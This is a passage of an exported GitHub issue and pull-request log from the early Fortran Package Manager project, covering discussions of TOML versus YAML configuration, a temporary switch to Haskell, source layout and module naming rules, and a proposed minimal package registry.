-with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\nI'm not strongly opposed to toml, but it's the one I'm least familiar with. My gut tells me we should go with yaml. I would not suggest json or xml though, too much syntax/line noise.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 00:35:16+00:00",
                    "text": "Both toml and yaml look good and have sufficient capability. Yaml is personally slightly prettier to me.\nWhich has a more mature parser in Haskell? Let's go with that one.\nI recommend against json for configuration files (even though I use it a lot) because it doesn't allow comments. This would make it harder to work with them in development and testing when you want to quickly try out different values. It's also a bit more noisy (verbose) than either toml or yaml.\nxml burns my eyes."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 01:44:44+00:00",
                    "text": "There are parsers for both that seem pretty mature. I just think yaml is more naturally represented as a simple/common data structure, so it is easier to work with once it's parsed.\n@certik , do you have a vote?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 01:50:06+00:00",
                    "text": "I vote for toml, I think it's more readable, that's what Rust and Python uses and I would follow exactly the Rust model for everything unless we have a good reason not to. Fortran is close to Python and Rust in most respects than to Haskell.\n\u2026\nOn Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n\n\n There are parsers for both that seem pretty mature. I just think yaml\n is more naturally represented as a simple/common data structure, so it\n is easier to work with once it's parsed.\n\n @certik <https://github.com/certik> , do you have a vote?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#44 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 02:03:10+00:00",
                    "text": "Here are good pros and cons:\n\nhttps://www.reddit.com/r/rust/comments/7izxrg/toml_or_yaml_for_config/\n\nOne big downside of yaml is that it is very complicated. TOML is very simple for flat configuration files, and Cargo shows that flat is enough. And we should strive for flat.\n\nI agree that we should not use JSON or XML.\n\u2026\nOn Thu, Mar 12, 2020, at 7:49 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I vote for toml, I think it's more readable, that's what Rust and\n Python uses and I would follow exactly the Rust model for everything\n unless we have a good reason not to. Fortran is close to Python and\n Rust in most respects than to Haskell.\n\n On Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n >\n >\n > There are parsers for both that seem pretty mature. I just think yaml\n > is more naturally represented as a simple/common data structure, so it\n > is easier to work with once it's parsed.\n >\n > @certik <https://github.com/certik> , do you have a vote?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#44 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 03:10:43+00:00",
                    "text": "@certik , that sounds reasonable. I put together an example of what an fpm.yaml file would look like (#46). Could you try converting that to toml so we can see what that would look like?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 04:08:58+00:00",
                    "text": "I am now in favor of toml as well. I like the idea of following the Rust packaging model."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 16:29:17+00:00",
                    "text": "@everythingfunctional see my comments at #46: #46 (comment) how it would look like in YAML and TOML. Let me know your thoughts."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-23 16:56:09+00:00",
                    "text": "I think the TOML looks fine. I'll start trying to put together the logic to pull in the dependencies, and compile them in the right order based on the fpm.toml file."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 18:49:37+00:00",
                    "text": "@everythingfunctional perfect. Let me know once you have something, and I'll test it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-28 18:31:28+00:00",
                    "text": "I'm going to go ahead and close this issue, since I think we've decided to stick with toml. Plus we're now moving forward in that direction."
                }
            ]
        },
        {
            "number": 43,
            "user": "everythingfunctional",
            "date": "2020-03-07 03:48:33+00:00",
            "title": "Add place to specify other libraries when building library",
            "text": "This completes all the necessary capabilities of the build system.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-09 03:32:59+00:00",
                    "text": "Next step is to start putting together fpm.toml files and code to read them."
                }
            ]
        },
        {
            "number": 42,
            "user": "everythingfunctional",
            "date": "2020-02-28 15:52:57+00:00",
            "title": "Bpr add build system",
            "text": "Can now build a single project. Assumes all files in the app directory are programs.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 16:15:59+00:00",
                    "text": "I tested it locally and it seems to work. Thanks!"
                }
            ]
        },
        {
            "number": 41,
            "user": "certik",
            "date": "2020-02-25 22:45:09+00:00",
            "title": "Test calling GFortran from Haskell",
            "text": "Tests the new builder on the example.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 17:27:18+00:00",
                    "text": "@everythingfunctional I think the build code in master failed on Windows: https://github.com/fortran-lang/fpm/pull/41/checks?check_run_id=475345857"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-04 04:16:07+00:00",
                    "text": "Got it to work on Windows. Problem was inconsistencies with file paths. At various places, Shake normalizes them to Linux form, but other things are still in Windows form."
                },
                {
                    "user": "certik",
                    "date": "2020-03-04 04:41:30+00:00",
                    "text": "@everythingfunctional thanks a lot for fixing it! I am really happy it works on Windows also."
                }
            ]
        },
        {
            "number": 40,
            "user": "everythingfunctional",
            "date": "2020-02-25 18:34:35+00:00",
            "title": "Switch to using Haskell",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-25 18:43:48+00:00",
                    "text": "The Linux and Mac works, the Windows fails due to mstksg/setup-stack#5. I am figuring a workaround."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 18:48:36+00:00",
                    "text": "@milancurcic: To describe our plan here: @everythingfunctional and I decided to join forces on FPM. Brad has already an implementation in Haskell of a subset of what we want FPM to do, and we decided to use his code to get the minimal viable version of FPM. So we'll do it in Haskell. It turns out Haskell's Stack is like Rust's Cargo, and both do what we want to achieve with FPM.\nOnce we have the minimal viable version working, we, as a community, will have to choose a language to implement this in for the long run (I still think Rust is not a bad option). But for now our goal is to get a minimal version out there, and the best is to join forces as much as we can."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 18:54:02+00:00",
                    "text": "Sounds good. I like Haskell as well. I was more interested in learning Rust though. However this is a practical decision and getting to MVP sooner is what matters.\nI only wish this was discussed in the open rather than decided under the table. Not so much about who makes the decision, but more about how and why are decisions made."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:04:34+00:00",
                    "text": "@milancurcic thanks for the comment. (Yes, I am personally more interested in learning Rust also.)\nI should have phrased it differently. We are working on the PR and once we are done with the PR, we would like to get a community agreement that this would be an ok path to get to the MVP. We have not made the decision under the table. Only if the community agrees, then we will merge the PR.\nThe downside is that Haskell is not as well known language. The huge upside is that now we have 2 developers (@everythingfunctional and myself) as opposed to just one developer (myself). And that, in my eyes, outweighs the slight negative of using a different language for the MVP.\nOnce MVP is out, we would need to decide what language to use for the long run. (I think I would prefer either C++ or Rust for that.)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:16:03+00:00",
                    "text": "Thanks for clarifying that, sounds like a good plan."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:49:57+00:00",
                    "text": "Tests pass. This is currently just a bare bones Haskell project, but it runs on Linux, macOS and Windows.\n@milancurcic would you be ok with merging this PR now? It would help us to develop faster --- have a master that passes tests everywhere and we can quickly send PRs to get the features implemented. The Rust version is still there in the archive directory if we every wanted to come back to it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-02-25 19:51:27+00:00",
                    "text": "I think we can have some MVP within the week. If things go wrong or the community would rather switch back to using Rust or something else, we can always switch back to that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:58:00+00:00",
                    "text": "This is fine with me. As I'm not actively engaged yet, I don't have much say. But I also don't foresee issues when I do start contributing. So please go ahead with whatever you find is the best way forward and keep discussing."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 22:08:44+00:00",
                    "text": "Thanks @milancurcic! We'll keep you updated."
                }
            ]
        },
        {
            "number": 39,
            "user": "certik",
            "date": "2020-02-24 21:56:43+00:00",
            "title": "Package layout",
            "text": "We've been working with @everythingfunctional on the standardization of the layout. First iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n$ cat fpm.toml \nName \"a\"\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-24 23:17:07+00:00",
                    "text": "Here is a second iteration of the above layout:\n$ tree .\n.\n\u251c\u2500\u2500 app\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.f90\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 x\n    \u2514\u2500\u2500 x.f90\n\n5 directories, 6 files"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:22:34+00:00",
                    "text": "I'm really confused now.\n\nThis thread doesn't say that the source file should have the same name as the module;\nIt actually implies that it can be different, e.g. utils.f90 defines module a_utils.\nfpm can't build this example because of #57.\n\nSo based on feedback so far, I assume that source file should be named the same as the module, and perhaps the spec in this thread is out of date. Then you have (ignoring app and x.f90 for simplicity):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 a_b_utils.f90\n\n2 directories, 4 files\n\nNow the source files have the same name as the modules they define. This doesn't work either because fpm builds b_a_b_utils.o out of src/b/a_b_utils.f90:\n# gfortran (for build/debug/library/a_utils.o build/debug/library/a_utils.mod)\n# gfortran (for build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod)\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/debug/library/b_a_b_utils.o\n  build/debug/library/b_a_b_utils.mod - MISSING\n\nOkay, so fpm does some renaming of files under the hood--b/a_b_utils.f90 compiles to b_a_b_utils.f90. But the compiler emits a_b_utils.mod and fpm expects b_a_b_utils.mod.\nA-ha! Maybe I need to call my module b_a_b_utils:\n$ head -1 src/b/a_b_utils.f90 \nmodule b_a_b_utils\n\nGreat, fpm now builds correctly.\nPerhaps this is what Brad meant in #57 when he said\n\nwe want the file name to match the module name, and the module name to include the path components of the file name.\n\nI didn't understand this because the 1st half of the sentence conflicts the 2nd half of the sentence.\nBut I think the 2nd half is key: If you have src/a/b/c/utils.f90, then the module should be called a_b_c_utils.\nGiven this, perhaps I can reverse engineer the correct spec. Let's try a third iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502   \u2514\u2500\u2500 b_utils.f90\n    \u2514\u2500\u2500 utils.f90\n\nThen, the contents are:\n$ cat src/a.f90 \nmodule a\nuse utils, only: util1\nuse b_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/b_utils.f90 \nmodule b_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nfpm builds this correctly.\nNow, if I went through this much trouble to figure this out with help from fpm developers, imagine other people trying to build their thing with fpm. :)\nWe need a clear, clean, explicit spec."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 17:34:12+00:00",
                    "text": "@everythingfunctional and I discussed this, and the solution that we both liked in the end is precisely as I posted above (which is different to your comment), I just didn't have time to write it more explicitly. @milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\nThe most natural way seems to have a file src/a/b/utils.f90, which means a package \"a.b\", and module \"a.b.utils\" (using Python syntax). However, in Fortran we do not have nested packages, until j3-fortran/fortran_proposals#86 is implemented. But what we can do now is to put the package name in the name of the module, so the file src/a/b/utils.f90 would start with module a_b_utils and fpm would check / enforce it. To move files around, you can simply move them, and fpm will have a mode to rename the first module line correctly.\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\nNow we are just working on fpm to work like this. If there are some bugs, then we need to fix them.\nIn particular, we need to write more tests, which would clarify what is meant to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 17:38:11+00:00",
                    "text": "Ok, yeah. Here's what I think the specification about that would be.\nfpm replaces the path separators with underscores when determining the name of the .o file to be created when compiling a given source file. For modules, it also expects compiling that source file to create a .mod file with the same name as the .o file. This means that a source file a/b/utils.f90 should contain a module named a_b_utils.\nI'm sure this could use a bit more wordsmithing or clarification. It also needs to be fit into a larger specification about the expected (default) organization of an fpm compatible project, with instructions about how to override the defaults."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:57:01+00:00",
                    "text": "@milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\n\nWhat do you think I'm doing? :)\n\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\n\nI don't propose that, it's how I originally understood Brad, but that's not what he meant and I understood it later. What led me astray is that the 2nd iteration of your tree wasn't consistent with the module names in the original post.\nBased on the feedback, here's the package structure (same as Ondrej's 2nd iteration):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n\nAnd here are the contents:\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/a_utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nDoes this look correct?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 18:17:27+00:00",
                    "text": "Almost. You are still putting the prefix into the filename in a_utils.f90. It should look like in #39 (comment). So put a_utils.f90 into a/utils.f90.\nI also had the b module nested under a, but that just depends what you are trying to show. Both can be done."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:27:00+00:00",
                    "text": "Oops, you're right, I did that. If we ignore src/x* and app, we get:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_b_utils\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_utils\n    \u2514\u2500\u2500 a.f90 # module a\n\n3 directories, 4 files\n\nI put module names as # comments next to each file. I think this is correct now and I agree with it.\nIf you agree, I'll submit a PR to document this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:32:28+00:00",
                    "text": "Btw, current master of fpm builds this correctly."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 19:04:45+00:00",
                    "text": "@milancurcic yes, if you could please document this and the reasoning behind this decision, that would be awesome. I am really happy you agree with this also. It's different to what I've been used to doing, but only in the fact that each module has the full name in the module line (and when you think about it, it makes sense to do it that way until j3-fortran/fortran_proposals#86 is implemented). Otherwise I've seen lots of projects structured in directories like this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 20:38:49+00:00",
                    "text": "It looks like we're on the same page now. Thanks for struggling through this @milancurcic . I know we didn't do a very good job documenting it, so your efforts are hugely appreciated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:30:00+00:00",
                    "text": "I think this is pretty well settled now. Should we close this?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:10+00:00",
                    "text": "We should document these choices and why we chose it. Then we can close this. Because this will come up again.\n\u2026\nOn Wed, Apr 29, 2020, at 9:30 PM, Brad Richardson wrote:\n\n\n I think this is pretty well settled now. Should we close this?\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#39 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWES7J5OW4SJVYLBDYLRPDWENANCNFSM4K2TQKOQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:41:18+00:00",
                    "text": "This issue does not have much info anyway and it is documented in the tutorial a bit, so let's close this one."
                }
            ]
        },
        {
            "number": 38,
            "user": "certik",
            "date": "2020-02-23 18:31:31+00:00",
            "title": "Implement common_prefix",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-23 18:40:48+00:00",
                    "text": "There is a failure on Windows due to / vs \\. I am glad we test it. I have to investigate and fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:53:58+00:00",
                    "text": "I am going to close this one for now."
                }
            ]
        },
        {
            "number": 37,
            "user": "certik",
            "date": "2020-02-20 21:37:08+00:00",
            "title": "CI: Do not install GFortran (already present)",
            "text": "Implemented in actions/virtual-environments#202 (comment).",
            "comments": []
        },
        {
            "number": 36,
            "user": "certik",
            "date": "2020-01-31 19:59:25+00:00",
            "title": "How to handle packages that do not have `fpm.toml`",
            "text": "There will be a lot of packages that do not have fpm.toml. Here is my suggested approach how to handle that:\n\n\nEncourage every package to use fpm.toml and to use fpm.\n\n\nThose packages that do not use it yet could be handled as follows: we will maintain a version (fork) at GitHub or GitLab that includes the fpm.toml. It will be this fork that would be used with fpm. From fpm's perspective, each package always contains fpm.toml.\n\n\nThe alternative to (or modification of) 2. is to allow fpm.toml to specify where to find sources of the actual package. So our GitLab package can be just one file fpm.toml that would list the metadata and where to download the sources plus any patches to them.\n\n\nIn particular, here is my plan: I will start with forking the packages listed at #17 and implementing fpm.toml together with any modifications that might be needed. I will not submit a PR back initially, but rather simply get my forks working well with fpm, and test it all out and get some usage. Then, as things start to get more serious and the fpm tool matures, we can easily send a PR against the upstream package and start the discussion with upstream authors if they would be willing to use fpm and maintain fpm.toml themselves. And depending on how this conversation goes, we'll either do just 2., or if we need to, we can also implement 3. in fpm. I expect that upstream authors will give us a list of features that they need fpm to have implemented, and once we do, they would be willing to use it.",
            "comments": []
        },
        {
            "number": 35,
            "user": "certik",
            "date": "2020-01-31 19:25:52+00:00",
            "title": "Full package registry",
            "text": "After #34 is implemented, we can discuss how to implement a full package registry similar to https://crates.io. It would be an extension of #34, which would also include hosting of the tarballs, and collecting usage statistics and other things. I think the solution in #34 can be evolved into this.",
            "comments": []
        },
        {
            "number": 34,
            "user": "certik",
            "date": "2020-01-31 19:22:34+00:00",
            "title": "Minimal metadata registry",
            "text": "After #33 is implemented, the next step is to implement a minimal metadata registry. Here is one way to do that:\n\nHave repository https://github.com/fortran-lang/package-registry that would contain a simple JSON file of this form which is the package registry:\n\n[{\n    \"name\": \"stdlib\",\n    \"versions\": [\n        {\"version\": \"0.3.4\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.4.tar.gz\"},\n        {\"version\": \"0.3.5\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.5.tar.gz\"},\n    ]\n}, {\n    \"name\": \"bspline\",\n    \"versions\": [\n        {\"version\": \"6.0.0\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/6.0.0.tar.gz\"},\n        {\"version\": \"5.4.2\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz\"},\n    ]\n}]\n\n\nWe will then have scripts that take this JSON file and download the actual metadata for each package version. So for example, to obtain the metadata for the package bspline version 5.4.2, it would download the tarball https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz, unpack and it would read its fpm.toml, which would contain all the metadata such as short and long description, the list of dependencies, and other things. Then we can automatically create a website which would list all this metadata. This generated website would contain a generated file metadata.json, which the fpm tool can then download to obtain a searchable data base of packages (fpm search).\n\n\nTo add a new package to registry, just a new simple entry must be made to the above JSON file by hand, say by issuing a PR against the repository.\n\n\nLater we can automate things more, similarly to how conda-forge works (https://conda-forge.org/docs/maintainer/adding_pkgs.html), where to put a new package in, a PR is sent against https://github.com/conda-forge/staged-recipes/, where the CI checks initial quality and that the package builds, and then if it gets merged, the CI actually creates a new repository for the package etc. In our case, we could have a staging repository, and if a PR is merged, the CI would correctly update the above JSON file.\n\n\nWe can discuss if the JSON file should also contain all the metadata from fpm.toml directly. The advantage of the above approach is that it is not redundant, the JSON only contains the minimal amount of information that can be edited and maintained by hand, and if you want more, you download the tarball and read its fpm.toml, which will be done automatically in the step 2.\nOverall, this minimal package registry only contains a minimal JSON file. The actual tarballs and metadata are hosted elsewhere. After this is well implemented and works, we can evolve it into a full package registry (#35).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-31 19:35:29+00:00",
                    "text": "The thing to discuss here, which we didn't have to worry about in #33 is what to do if multiple people want to have a bspline package. Should we require to prefix it with the github organization/user name, as in jacobwilliams/bspline, or what do we do if somebody submits (registers) the bspline name, but there will later be a better, more widely used and popular bspline package. If we simply switch the url for bspline from the old package to the new package, then all kinds of packages that already depend on the old bspline package would break. One approach could be that since most Fortran packages will be in this ecosystem, we would know which packages depend on it, so we could correctly update them all (and rename bspline to bspline_legacy). For example Debian had to rename the git package, as it wasn't the usual git, but some older package that just happened to be called git before the version control system came along. In our case I can see this happening for every popular package name such as \"mesh\", \"utils\", \"spline\", ... So we should have some policy how to handle such things. One such policy can be that we would evaluate the usage and a number of github stars, and allow the most used package to have the more popular name."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 19:49:28+00:00",
                    "text": "Great, thanks! The step 2 in the proposed flow assumes that the package will include its fpm.toml. However, this is only possible if the package has an active maintainer that is willing to maintain the package-specific fpm.toml. Would this not preclude fpm from downloading tarballed packages from the wild, like SOFA for example?\nIf the community maintains all metadata needed to download and build the package in the registry, it would broaden the ecosystem of packages fpm could work with."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 20:00:58+00:00",
                    "text": "@milancurcic your last comment seems to be a bit orthogonal issue, so I created #36 for it to discuss just this aspect of how fpm is designed."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:52:48+00:00",
                    "text": "Now that there's a package that can be built with fpm, let's revisit this issue which is a requirement for installing a package from a remote location such as a GitHub repo.\nI think @certik's idea of a minimal registry is a good start. We'll also need a description field, so that fpm list not just names of packages, but also there (one-line) descriptions, just like other package managers.\nAnother doubt I have is whether this should be a separate repository, rather than part of this repository. In my opinion, keeping it in this repo is simpler because:\n\nOne doesn't need to maintain a separate repo for the registry\nLess confusing for newcomers--there's only one repo (this one), whether you want to contribute to the code, or submit a package to the registry\nIssues+PR system allows clean separation between fpm issues and package submissions to the registry. So we don't need to separate them in another way.\n\nfpm would need to update its registry cache in either approach.\n@certik are there benefits of having a registry in a separate repo, or is it more an esthetic thing?\n\nSeparate vs. same repo question aside, how would this look like from the UI perspective? For simplicity, let's forget about search for now. Let's say we just want to be able to list available packages. This could be something like:\nfpm list\n  datetime-1.7.0 -- Date and time manipulation\n  openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n  stdlib-0.1.0 -- Fortran standard library\n\nUnder the hood, fpm:\n\nFetches the registry\nParses it\nLists individual packages and latest version so you get the above\n\nWe can discuss how to list individual available versions at a later time. Let's try to solve the minimal problem first."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:13:31+00:00",
                    "text": "My initial gut feeling is not to put packages in this repository. Although Spack does it like that and I think it works for them.\n\nEither way, fpm needs to download the packages from the internet, unless we do it like Spack, which reads them from a local repository checkout.\n\nI think since we are in a prototype mode, let's just put everything in this repo. Get things working for a few packages with dependencies and then let's figure out what to do for production version of fpm.\n\nLet's also understand well how Cargo does it and why something does not work for us. Let's also document our reasoning.\n\u2026\nOn Sun, May 10, 2020, at 12:53 PM, Milan Curcic wrote:\n\n\n Now that there's a package that can be built with fpm\n <https://github.com/wavebitscientific/datetime-fortran>, let's revisit\n this issue which is a requirement for installing a package from a\n remote location such as a GitHub repo.\n\n I think @certik <https://github.com/certik>'s idea of a minimal\n registry is a good start. We'll also need a description field, so that\n fpm list not just names of packages, but also there (one-line)\n descriptions, just like other package managers.\n\n Another doubt I have is whether this should be a separate repository,\n rather than part of this repository. In my opinion, keeping it in this\n repo is simpler because:\n\n  * One doesn't need to maintain a separate repo for the registry\n  * Less confusing for newcomers--there's only one repo (this one),\n whether you want to contribute to the code, or submit a package to the\n registry\n  * Issues+PR system allows clean separation between fpm issues and\n package submissions to the registry. So we don't need to separate them\n in another way.\n fpm would need to update its registry cache in either approach.\n\n @certik <https://github.com/certik> are there benefits of having a\n registry in a separate repo, or is it more an esthetic thing?\n\n Separate vs. same repo question aside, how would this look like from\n the UI perspective? For simplicity, let's forget about search for now.\n Let's say we just want to be able to list available packages. This\n could be something like:\n\n `fpm list\n   datetime-1.7.0 -- Date and time manipulation\n   openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n   stdlib-0.1.0 -- Fortran standard library\n `\n Under the hood, fpm:\n\n  1. Fetches the registry\n  2. Parses it\n  3. Lists individual packages and latest version so you get the above\n We can discuss how to list individual available versions at a later\n time. Let's try to solve the minimal problem first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#34 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGTEEJIDXEN5FKTROTRQ3ZYZANCNFSM4KOMKF7A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:33:50+00:00",
                    "text": "I think we should do what Cargo does with crates.io and have a separate repository for packages. Packages are stored there as tarballs and you can interact with it via a simple REST API. This gives us several advantages.\n\nWe can put certain checks in place for packages published to the official repo\nAnyone else can stand up their own repo, and just conform to the same API (i.e. private repos). We can even open-source the code for it\nAnyone else can write whatever tools they like to interact with it\n\nUntil we can get such a service stood up, we should endeavor to keep a list in the fpm README of known packages"
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 13:31:39+00:00",
                    "text": "@everythingfunctional what you are proposing is #35. I think we all agree on that one. We also agree that is a lot of work, and so right now we are discussing what to do until we get there.\nSo far the proposals are:\n\nDocument available packages in the README\nCreate a manual metadata registry (this issue #34)\n\nI think we should definitely try the manual metadata registry, not just a README, as it would allow us to almost get the full experience of #35.\n\nProgressing the discussion further, I proposed above how such a JSON file (if we use JSON) could look like. Milan suggested it also needs a description field. I don't think that's a good idea for the following reasons:\n\nThe description is another thing to handle manually\nIt can change between versions, so it would have to be attached to each version\nIt's duplicate from the upstream package's toml file, another thing to keep in sync.\n\nThe reason I think why Milan proposed it is to make it possible for fpm to print packages with more information about them. I agree fpm should be able to do that, but not in the above proposed way.\nThe same with putting this metadata in this repository.\nRather, we should plan out how to we get to fixing #35. And then in this issue we should do work that is aligned with it.\nSo here I am proposing a draft of such a plan:\n\nThe issue #35 is mainly about hosting tarballs. But everything else about the registry can be done as part of this issue\nHave a separate repository called fpm_registry\nThe fpm_registry will have a JSON file (with the format above)\nTo submit a package (version) to the registry, people send a PR towards fpm_registry to update the JSON file ---- and just like when submitting to pypi or crates, you do not fill out a separate description field, you should not here either --- that gets filled out automatically from fpm.toml (see below)\nThen we have a separate repository plus CI pipeline that automatically takes this JSON file and:\n\ndownloads each package (it can cache old info, so only needs to download new packages), extracts full metadata (description, dependencies, etc.) and uses that information to:\ncreate a nice website with a page for each package that looks like crates.io (has a description, links to dependencies, and any other useful metadata extracted from fpm.toml)\ncreate a \"registry JSON\", which has full metadata for each package, including description\n\n\nfpm gets updated to be able to download this \"registry JSON\" from this auto 